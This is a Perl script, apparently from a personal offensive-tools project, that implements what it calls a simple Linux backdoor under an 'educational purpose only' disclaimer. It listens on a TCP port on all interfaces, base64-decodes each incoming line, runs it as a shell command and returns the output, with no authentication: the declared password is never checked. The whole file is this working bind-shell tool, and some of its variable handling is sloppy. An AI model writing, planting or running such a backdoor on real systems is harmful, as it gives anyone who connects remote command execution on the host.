#!/bin/perl
# perl version : 5.30
# Description : This is a simple backdoor linux
package SrvBack;

use Getopt::Long;
use IO::Socket::INET;
use MIME::Base64;

Getopt::Long::Configure('bundling');

my $helpText = "
Description : This is a simple backdoor

Usage : \n
--port     |   \t: port to use (default port : 8888)
--help     | -h\t: print this help
--verbose  | -v\t: print more verbose

(This tool is for educational purpose only)

\n\nExample :

perl SrvBack.pl --port 8888
";

my $versionText = "
Author \t: \@Exo-poulpe
Version \t: 0.1.0.0

This tool is for educational purpose only, usage of PerlForing for attacking targets without prior mutual consent is illegal.
Developers assume no liability and are not responsible for any misuse or damage cause by this program.

";

my $help;
my $version;
my $verbose;
my $port = 8888;
my $password = "poulpe";
my $soc;

GetOptions(
    'port=i'       => \$port,        # int
    'version'      => \$version,     # flag
    'verbose|v'    => \$verbose,     # flag
    'help|h|?'     => \$help,        # flag
) or die($helpText);

sub main()
{
    if ( defined $help )
    {
        print($helpText);
    }
    elsif ( !defined $help )
    {
        my $tmpSoc;

        $soc = new IO::Socket::INET(
            LocalHost => '0.0.0.0',
            LocalPort => $port,
            Proto     => 'tcp',
            Listen    => 1,
            Reuse     => 1
        ) or die "ERROR in Socket Creation : $!\n";

        if ( defined $verbose )
        {
            print "SERVER Waiting client connection on port $port\n";
        }

        $tmpSoc = $soc->accept();
        if ( defined $verbose )
        {
            print("Connected\n");
        }
        my $res;
        my $err;
        close(STDERR);
        local *STDERR;
        open( STDOUT, ">>", $out );
        open( STDERR, ">>", $err );
        while (1)
        {
            while ( my $rec = <$tmpSoc> )
            {
                $rec = decode_base64($rec);
                chomp($rec);
                if($rec eq "exit")
                {
                    exit(0);
                }
                if ( defined $verbose )
                {
                    print("Rec : '$rec'\n");
                }
                if($res eq "exit")
                {
                    exit(0);
                }
                if ( $res eq "" )
                {
                    $res = "$err\n";
                }
                if ( defined $verbose )
                {
                    print("Data : $res\n");
                }
                $res = `$rec`;
                $tmpSoc->send( $res . "\0\n" );
            }

        }
        $soc->close();
    }
    else
    {
        print($helpText);
    }
}

main();
